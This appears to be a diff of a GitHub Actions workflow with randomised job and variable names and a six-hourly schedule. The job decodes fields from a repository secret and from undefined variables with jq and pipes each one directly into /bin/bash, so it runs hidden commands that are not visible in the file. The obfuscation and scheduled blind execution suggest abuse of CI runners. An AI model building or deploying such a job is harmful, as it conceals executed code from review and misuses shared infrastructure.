@@ -1,9 +1,8 @@
 name: tongmengxu4567
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 5/6 * * *'
+    - cron: '54 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,14 +10,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: tongmengxu4567
         env:
-          ds804: ${{ secrets.ds804 }}
+          ug56129: ${{ secrets.ug56129 }}
         run: |
-          echo $ds804 | jq -r .ntpit2466 | /bin/bash
-          echo $gwc582 | jq -r .xec3854 | /bin/bash
-          echo $qcfcu44 | jq -r .a40 | /bin/bash
-          echo $jgu61 | jq -r .kuif9287 | /bin/bash
-          echo $r0 | jq -r .qnw4643 | /bin/bash
-          echo $teabw61622 | jq -r .hv742 | /bin/bash
-          echo $pq1 | jq -r .e69 | /bin/bash
-          echo $dlv55 | jq -r .pb615 | /bin/bash
+          echo $ug56129 | jq -r .uaufb2 | /bin/bash
+          echo $vwie84622 | jq -r .wb43194 | /bin/bash
+          echo $iebl67 | jq -r .s77444 | /bin/bash
+          echo $kcut3 | jq -r .jqkc4457 | /bin/bash
+          echo $c65637 | jq -r .e86298 | /bin/bash
+          echo $tbwsn04386 | jq -r .spgny89 | /bin/bash
+          echo $qvp2530 | jq -r .qg110 | /bin/bash
+          echo $q51 | jq -r .is82327 | /bin/bash
+          echo $i7 | jq -r .uuw30063 | /bin/bash
 
